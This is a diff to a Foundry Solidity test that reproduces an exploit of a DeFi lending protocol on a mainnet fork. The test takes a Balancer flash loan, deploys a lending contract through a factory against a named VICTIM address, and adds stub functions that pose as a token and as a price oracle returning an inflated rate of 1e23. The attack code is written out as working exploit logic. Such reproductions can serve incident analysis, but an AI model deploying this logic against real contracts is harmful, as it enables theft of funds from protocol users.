@@ -21,7 +21,7 @@ interface IFactory {
         address token,
         address target,
         bytes memory data
-    ) external returns (address);
+    ) external;
 }
 
 interface ILendingProtocol {
@@ -57,9 +57,28 @@ contract ContractTest is Test {
         0xF541947cBb87FB3b7Ca81dAe9c66831167eA9f8C;
     address constant VICTIM = 0x14Ce500a86F1e3aCE039571e657783E069643617;
 
+    address lendingProtocolAddr;
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public returns (bool) {
+        return true;
+    }
+    function get(address) public returns (bool suceess, uint rate) {
+        return (true, 1e23);
+    }
+    function transfer(address to, uint256 amount) public returns (bool) {
+        return true;
+    }
+    function init() external returns (bool) {
+        return true;
+    }
+
     function setUp() public {
         // Fork mainnet at specific block
-        vm.createSelectFork("mainnet", 15460093);
+        vm.createSelectFork("mainnet", 21345752 - 1);
 
         // Label addresses for better trace output
         vm.label(address(USDC), "USDC");
@@ -104,14 +123,17 @@ contract ContractTest is Test {
         require(msg.sender == address(vault), "Only Balancer Vault");
 
         // Deploy lending protocol through factory
-        address lendingProtocolAddr = factory.deploy(
+        factory.deploy(
             IMPLEMENTATION,
             address(this),
             address(USDC),
             address(this),
-            abi.encodeWithSelector(bytes4(0x04343f58))
+            abi.encodeWithSignature("init()")
         );
-        lendingProtocol = ILendingProtocol(lendingProtocolAddr);
+
+        lendingProtocol = ILendingProtocol(
+            0xbd0D52E3A3F61F697A8767b395cE574Fa837c25b
+        );
 
         // Approve USDC spending
         USDC.approve(address(factory), type(uint256).max);
@@ -144,8 +166,5 @@ contract ContractTest is Test {
         // Repay flash loan
         USDC.approve(address(vault), amounts[0]);
         USDC.transfer(address(vault), amounts[0]);
-    }
-    fallback() external {
-        return;
     }
 }
